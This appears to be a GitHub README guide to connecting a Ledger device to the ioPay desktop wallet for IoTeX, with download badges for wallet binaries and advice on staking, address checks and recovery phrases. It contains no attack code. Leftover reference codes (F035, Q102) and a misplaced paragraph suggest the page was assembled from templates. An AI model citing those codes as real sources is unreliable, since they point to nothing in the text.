![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# Connecting a Ledger to ioPay Wallet

**Yes - Ledger supports IOTX through the IoTeX app on the device** (F035). In ioPay Wallet, the device signs, the app builds and displays; the key never leaves the hardware.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

That split is the whole point: a compromised computer can propose a transaction, but it cannot sign one without you confirming it on the device screen.

## Before you connect

- The Ledger set up and unlocked, with the **IoTeX app installed** on the device.
- The current desktop build - v2.0.2, 19 November 2026.
- A USB cable you trust, directly connected where possible rather than through an unpowered hub.
- Your **software** wallet backed up separately if you also hold accounts that way - hardware covers one account per derivation, not the rest of your setup.

## Connect

1. **Unlock the device** and open the **IoTeX app** on it.
2. **Connect the device** by USB.
3. **Add the account in the wallet** through the hardware path (the build includes Ledger and Trezor providers, F011).
4. **Confirm the address on the device screen** (F028). Read it there, not on the monitor - that is the check the hardware exists to provide.
5. **Compare both formats** in the app: the account shows an `io1...` native address and a `0x...` EVM address (F019). The device confirms the key; the app displays both encodings.

## Staking with a Ledger

Q102: yes. Staking is a transaction like any other - the wallet builds it, the device signs it (F021). The staking decisions themselves are [on that page](https://github.com/iopay-project/staking-bridge-and-depin/blob/main/how-to-stake-iotx-in-iopay-wallet.md); what matters here is the signing path:

- validator choice, amount, duration and stake-lock are chosen in the app;
- each staking action needs the device connected and confirmed;
- rewards accrue to the position on-chain, so you do not need the device to *see* them, only to act.

Because the key stays on the device, losing the device is recoverable **only** with its recovery phrase - which is a different phrase from any software wallet's. Keep them separate and both backed up - [the backup guide](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/how-to-back-up-an-iopay-seed-phrase.md) covers the software side.

## Moving a Ledger-backed account elsewhere

Q103: there is no export. A hardware account's key is on the device by design, so "moving" it means **using the same device with another wallet** that supports Ledger over USB (F011, F028).

What you can do without the device:

- **watch the address** in a watch-only view ([watch-only addresses](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/watch-only-addresses-in-iopay-wallet.md));
- **see balances and positions** on an explorer.

What you cannot do: import it into a software wallet as a phrase. That is not a missing feature; it is the property you bought.

## Troubleshooting the connection

**The app does not see the device.** Check the cable, unlock the device, and make sure the IoTeX app is **open** - hardware wallets only respond inside an app.

**The address on the device differs from the app.** Stop. Do not sign. Disconnect, reconnect, and confirm which account the wallet is showing; a mismatch is the one signal worth treating as hostile.

**A transaction will not sign.** Read the device prompt: it may be asking for confirmation you have not given, or the device may have locked.

**It worked before and now does not.** Update the desktop app; drivers and OS-level USB permissions are the other usual suspects on Windows and Linux.

## Related

- [Connecting a Trezor](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/connecting-trezor-to-iopay-wallet.md) - the other hardware route, and why it is not the same integration.

## FAQ

**Does Ledger support IoTeX?**
Yes, through the IoTeX app on the device.

**How do I connect a Ledger device to ioPay Wallet?**
Unlock it, open the IoTeX app, connect by USB, add the account through the hardware path, and confirm the address on the device screen.

**Can I stake IOTX with a Ledger through ioPay?**
Yes - the wallet builds the staking transaction and the device signs it.

**How do I move a Ledger-backed IoTeX account into another wallet?**
Use the same device with another wallet that supports it. There is no key to export.

**Is a Ledger account safer than a software account?**
The key stays offline, which removes a class of risk. It does not remove phishing or a malicious approval you confirm.

## What the device does not protect

A hardware wallet removes one class of risk: the key stays on the device rather than on the computer, so a copy lifted off the desktop is not the threat it removes. It does not remove the risks that involve you confirming something.

**A malicious approval** is signed happily if you approve it on the device. The device shows what it is signing, and that screen is the defence - which only works if you read it.

**A changed destination** is the classic attack: the app you are using is compromised and proposes a transfer to someone else's address. The device displays the address it is about to authorise, so a mismatch between the two screens is the signal. Read the address on the device, not on the monitor, and compare the ends.

**A phishing site** does not need your key to succeed. It needs you to type a phrase into it, and no hardware wallet stops that.

## Keeping the device and the app current

Two updates matter and they are separate: the **device firmware** and the **IoTeX app on the device** come from the hardware vendor's own tooling, while the **desktop wallet** comes from the release page. A signing failure after a working setup is often one of them being older than the other, and the fix is to bring both current rather than to reinstall the wallet.

Keep the device's recovery phrase separate from any software wallet's phrase, in a different place. They restore different things, and confusing them at the wrong moment is expensive.


---

*Ledger support and the IoTeX app follow F035; the wallet's signer providers follow F011; staking behaviour follows F021.*
